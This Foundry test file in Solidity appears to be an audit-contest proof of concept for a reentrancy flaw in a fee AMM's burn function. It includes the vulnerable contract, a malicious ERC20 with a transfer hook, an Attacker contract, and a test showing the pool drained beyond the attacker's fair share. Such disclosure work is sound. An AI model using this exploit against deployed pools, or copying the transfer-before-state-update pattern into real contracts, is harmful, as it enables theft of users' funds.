// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// ── Minimal FeeAMM (copied verbatim from contest source) ─────────────────────

interface IERC20Like {
    function transferFrom(address, address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract FeeAMMPoC {
    uint256 public constant M = 9970;
    uint256 public constant N = 9985;
    uint256 public constant SCALE = 10_000;
    uint256 public constant MIN_LIQUIDITY = 1000;

    struct Pool {
        uint128 reserveUserToken;
        uint128 reserveValidatorToken;
    }

    mapping(bytes32 => Pool) public pools;
    mapping(bytes32 => uint256) public totalSupply;
    mapping(bytes32 => mapping(address => uint256)) public liquidityBalances;

    function _requireU128(uint256 x) internal pure {
        require(x <= type(uint128).max, "INVALID_AMOUNT");
    }

    function getPoolId(address userToken, address validatorToken) public pure returns (bytes32) {
        return keccak256(abi.encode(userToken, validatorToken));
    }

    function getPool(address userToken, address validatorToken) external view returns (Pool memory) {
        return pools[getPoolId(userToken, validatorToken)];
    }

    function mint(
        address userToken,
        address validatorToken,
        uint256 amountValidatorToken,
        address to
    ) external returns (uint256 liquidity) {
        require(userToken != validatorToken, "IDENTICAL_ADDRESSES");
        require(amountValidatorToken != 0, "INVALID_AMOUNT");

        bytes32 poolId = getPoolId(userToken, validatorToken);
        Pool storage pool = pools[poolId];
        uint256 _totalSupply = totalSupply[poolId];

        if (pool.reserveUserToken == 0 && pool.reserveValidatorToken == 0) {
            if (amountValidatorToken / 2 <= MIN_LIQUIDITY) revert("INSUFFICIENT_LIQUIDITY");
            liquidity = amountValidatorToken / 2 - MIN_LIQUIDITY;
            totalSupply[poolId] += MIN_LIQUIDITY;
        } else {
            uint256 product = (N * uint256(pool.reserveUserToken)) / SCALE;
            uint256 denom = uint256(pool.reserveValidatorToken) + product;
            liquidity = (amountValidatorToken * _totalSupply) / denom;
        }

        if (liquidity == 0) revert("INSUFFICIENT_LIQUIDITY");
        _requireU128(amountValidatorToken);

        IERC20Like(validatorToken).transferFrom(msg.sender, address(this), amountValidatorToken);
        pool.reserveValidatorToken += uint128(amountValidatorToken);
        totalSupply[poolId] += liquidity;
        liquidityBalances[poolId][to] += liquidity;
    }

    // !! VULNERABLE: external calls before state updates !!
    function burn(
        address userToken,
        address validatorToken,
        uint256 liquidity,
        address to
    ) external returns (uint256 amountUserToken, uint256 amountValidatorToken) {
        require(userToken != validatorToken, "IDENTICAL_ADDRESSES");
        require(liquidity != 0, "INVALID_AMOUNT");

        bytes32 poolId = getPoolId(userToken, validatorToken);
        Pool storage pool = pools[poolId];

        if (liquidityBalances[poolId][msg.sender] < liquidity) revert("INSUFFICIENT_LIQUIDITY");

        uint256 _totalSupply = totalSupply[poolId];
        amountUserToken      = (liquidity * pool.reserveUserToken)      / _totalSupply;
        amountValidatorToken = (liquidity * pool.reserveValidatorToken)  / _totalSupply;

        _requireU128(amountUserToken);
        _requireU128(amountValidatorToken);

        // !! BUG: transfers happen BEFORE state is updated !!
        IERC20Like(userToken).transfer(to, amountUserToken);            // re-entry hook fires here
        IERC20Like(validatorToken).transfer(to, amountValidatorToken);

        // State updated AFTER — too late to protect against re-entry.
        // NOTE: compiled with pragma >=0.7.6 <0.8.0 (no built-in overflow checks).
        //       Solidity 0.8 would revert on underflow; 0.7 wraps silently.
        //       We use unchecked here to faithfully replicate the 0.7.x target behaviour.
        unchecked {
            liquidityBalances[poolId][msg.sender] -= liquidity;
            totalSupply[poolId] -= liquidity;
            pool.reserveUserToken      -= uint128(amountUserToken);
            pool.reserveValidatorToken -= uint128(amountValidatorToken);
        }
    }

    function executeFeeSwap(
        address userToken,
        address validatorToken,
        uint256 amountIn
    ) external returns (uint256 amountOut) {
        bytes32 poolId = getPoolId(userToken, validatorToken);
        Pool storage pool = pools[poolId];
        amountOut = (amountIn * M) / SCALE;
        _requireU128(amountIn);
        _requireU128(amountOut);
        require(pool.reserveValidatorToken >= amountOut, "INSUFFICIENT_LIQUIDITY");

        IERC20Like(userToken).transferFrom(msg.sender, address(this), amountIn);
        pool.reserveUserToken      += uint128(amountIn);
        pool.reserveValidatorToken -= uint128(amountOut);
        IERC20Like(validatorToken).transfer(msg.sender, amountOut);
    }
}

// ── Malicious ERC20 with transfer hook ───────────────────────────────────────

contract HookToken is ERC20 {
    address public hook;        // contract to notify on transfer
    bool    public hookEnabled;

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) external { _mint(to, amount); }

    function setHook(address _hook) external { hook = _hook; }
    function enableHook()  external { hookEnabled = true; }
    function disableHook() external { hookEnabled = false; }

    function decimals() public pure override returns (uint8) { return 6; }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        bool result = super.transfer(recipient, amount);
        if (hookEnabled && hook != address(0)) {
            IReentrancyReceiver(hook).onTokenReceived(msg.sender, recipient, amount);
        }
        return result;
    }
}

interface IReentrancyReceiver {
    function onTokenReceived(address token, address recipient, uint256 amount) external;
}

// ── Attacker contract ─────────────────────────────────────────────────────────

contract Attacker is IReentrancyReceiver {
    FeeAMMPoC public amm;
    address   public userToken;
    address   public validatorToken;
    uint256   public reentrancyDepth;
    uint256   public maxDepth;

    constructor(
        address _amm,
        address _userToken,
        address _validatorToken,
        uint256 _maxDepth
    ) {
        amm            = FeeAMMPoC(_amm);
        userToken      = _userToken;
        validatorToken = _validatorToken;
        maxDepth       = _maxDepth;
    }

    // Called by HookToken.transfer() every time tokens arrive here
    function onTokenReceived(address /*token*/, address /*recipient*/, uint256 /*amount*/) external override {
        if (reentrancyDepth >= maxDepth) return;

        bytes32 poolId = amm.getPoolId(userToken, validatorToken);
        uint256 myBalance = amm.liquidityBalances(poolId, address(this));
        if (myBalance == 0) return;

        reentrancyDepth++;
        amm.burn(userToken, validatorToken, myBalance, address(this));
    }
}

// ── Test ──────────────────────────────────────────────────────────────────────

contract Finding_PoC is Test {
    FeeAMMPoC  public amm;
    HookToken  public userToken;
    HookToken  public validatorToken;

    address lp      = makeAddr("lp");
    address swapper = makeAddr("swapper");

    uint256 constant LP_DEPOSIT  = 200_000e6;
    uint256 constant SWAP_AMOUNT = 50_000e6;

    function setUp() public {
        amm            = new FeeAMMPoC();
        userToken      = new HookToken("User TIP-20 USD", "uUSD");
        validatorToken = new HookToken("Validator TIP-20 USD", "vUSD");

        // LP seeds pool with 200k validatorToken
        validatorToken.mint(lp, LP_DEPOSIT);
        vm.startPrank(lp);
        validatorToken.approve(address(amm), type(uint256).max);
        amm.mint(address(userToken), address(validatorToken), LP_DEPOSIT, lp);
        vm.stopPrank();

        // Swapper executes a fee swap so userToken reserve is non-zero
        userToken.mint(swapper, SWAP_AMOUNT);
        vm.startPrank(swapper);
        userToken.approve(address(amm), type(uint256).max);
        amm.executeFeeSwap(address(userToken), address(validatorToken), SWAP_AMOUNT);
        vm.stopPrank();
    }

    /// @notice Control: normal burn with no hook — should pass, LP gets fair share
    function test_control_normalBurn() public {
        bytes32 poolId = amm.getPoolId(address(userToken), address(validatorToken));

        uint256 lpBalance = amm.liquidityBalances(poolId, lp);
        assertTrue(lpBalance > 0, "LP has no balance");

        uint256 ammUserBefore      = userToken.balanceOf(address(amm));
        uint256 ammValidatorBefore = validatorToken.balanceOf(address(amm));

        vm.startPrank(lp);
        (uint256 gotUser, uint256 gotValidator) = amm.burn(
            address(userToken),
            address(validatorToken),
            lpBalance,
            lp
        );
        vm.stopPrank();

        emit log_named_uint("LP received userToken",      gotUser);
        emit log_named_uint("LP received validatorToken", gotValidator);

        // AMM balance decreased correctly
        assertEq(userToken.balanceOf(address(amm)),      ammUserBefore      - gotUser);
        assertEq(validatorToken.balanceOf(address(amm)), ammValidatorBefore - gotValidator);
    }

    /// @notice Exploit: burn reentrancy via ERC777-style transfer hook drains pool
    /// @dev Attack flow:
    ///      1. Attacker mints LP tokens with 10k validatorToken (small position)
    ///      2. Attacker calls burn(lpBalance, to=attackerContract)
    ///      3. IERC20(userToken).transfer(attackerContract, amount) fires
    ///      4. Attacker's onTokenReceived re-enters burn() — lpBalance NOT yet decremented
    ///      5. Same lpBalance passes the check, same amounts are computed & transferred
    ///      6. Recurses `maxDepth` times, draining tokens far beyond attacker's fair share
    function test_exploit_burnReentrancy() public {
        bytes32 poolId = amm.getPoolId(address(userToken), address(validatorToken));

        // Attacker mints a small LP position (10k validatorToken = ~5% of pool)
        uint256 ATTACKER_DEPOSIT = 10_000e6;
        Attacker attacker = new Attacker(
            address(amm),
            address(userToken),
            address(validatorToken),
            4   // re-enter 4 times → 5x total calls
        );
        validatorToken.mint(address(attacker), ATTACKER_DEPOSIT);
        vm.startPrank(address(attacker));
        validatorToken.approve(address(amm), type(uint256).max);
        amm.mint(address(userToken), address(validatorToken), ATTACKER_DEPOSIT, address(attacker));
        vm.stopPrank();

        uint256 attackerLp    = amm.liquidityBalances(poolId, address(attacker));
        uint256 ammUserBefore = userToken.balanceOf(address(amm));
        uint256 ammValBefore  = validatorToken.balanceOf(address(amm));

        emit log_named_uint("Attacker LP balance",           attackerLp);
        emit log_named_uint("[before] AMM userToken",        ammUserBefore);
        emit log_named_uint("[before] AMM validatorToken",   ammValBefore);

        // Compute fair share WITHOUT reentrancy
        uint256 totalSupply = amm.totalSupply(poolId);
        FeeAMMPoC.Pool memory p = amm.getPool(address(userToken), address(validatorToken));
        uint256 fairUser = (attackerLp * p.reserveUserToken)      / totalSupply;
        uint256 fairVal  = (attackerLp * p.reserveValidatorToken)  / totalSupply;
        emit log_named_uint("Fair share userToken",          fairUser);
        emit log_named_uint("Fair share validatorToken",     fairVal);

        // Enable reentrancy hook BEFORE calling burn
        userToken.setHook(address(attacker));
        userToken.enableHook();

        vm.startPrank(address(attacker));
        amm.burn(address(userToken), address(validatorToken), attackerLp, address(attacker));
        vm.stopPrank();

        uint256 ammUserAfter  = userToken.balanceOf(address(amm));
        uint256 ammValAfter   = validatorToken.balanceOf(address(amm));
        uint256 gotUser       = userToken.balanceOf(address(attacker));
        uint256 gotVal        = validatorToken.balanceOf(address(attacker));

        emit log_named_uint("Reentrancy depth reached",      attacker.reentrancyDepth());
        emit log_named_uint("[after]  AMM userToken",        ammUserAfter);
        emit log_named_uint("[after]  AMM validatorToken",   ammValAfter);
        emit log_named_uint("Attacker received userToken",   gotUser);
        emit log_named_uint("Attacker received validatorToken", gotVal);
        emit log_named_uint("Overpayment multiplier (userToken x times fair)", gotUser / (fairUser + 1));

        // Attacker re-entered and drained far more than their fair share
        assertTrue(attacker.reentrancyDepth() > 0, "No reentrancy occurred");
        assertGt(gotUser, fairUser, "Attacker should receive more than fair share via reentrancy");
        assertGt(gotVal,  fairVal,  "Attacker should receive more validatorToken than fair share");
    }
}
